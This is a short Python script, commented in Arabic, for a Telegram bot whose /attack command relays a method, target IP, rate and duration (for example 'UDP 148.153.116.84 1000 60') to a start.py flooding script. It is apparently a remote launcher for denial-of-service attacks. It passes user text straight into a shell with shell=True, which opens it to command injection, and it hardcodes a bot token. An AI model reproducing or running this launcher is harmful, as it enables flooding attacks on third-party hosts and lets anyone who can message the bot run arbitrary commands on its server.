import telebot
import subprocess

# إعداد التوكن الخاص بالبوت
TOKEN = '7451734888:AAEMwPAO0NYKZxAVbr84-4yl9eMQWNf-YA8'
bot = telebot.TeleBot(TOKEN)

# المسار الخاص بملف start.py
START_SCRIPT_PATH = 'start.py'  # قم بتعديل المسار إلى ملف start.py

@bot.message_handler(commands=['attack'])
def start_attack(message):
    try:
        # استخراج البارامترات من الرسالة
        data = message.text.split(' ', 1)  # تقسيم النص بعد الأمر
        if len(data) < 2:
            bot.reply_to(message, "يرجى إرسال البارامترات مع الأمر. مثال:\n/start_attack UDP 148.153.116.84 1000 60")
            return

        # البارامترات المرسلة
        params = data[1]  # النص بعد الأمر
        command = f"python3 {START_SCRIPT_PATH} {params}"  # بناء الأمر لتنفيذ start.py مع البارامترات

        # تشغيل ملف start.py
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        # إرسال النتيجة
        if process.returncode == 0:
            bot.reply_to(message, f"تم تنفيذ الأمر بنجاح:\n{stdout.decode()}")
        else:
            bot.reply_to(message, f"حدث خطأ أثناء التنفيذ:\n{stderr.decode()}")
    except Exception as e:
        bot.reply_to(message, f"حدث خطأ: {e}")

# تشغيل البوت
bot.polling()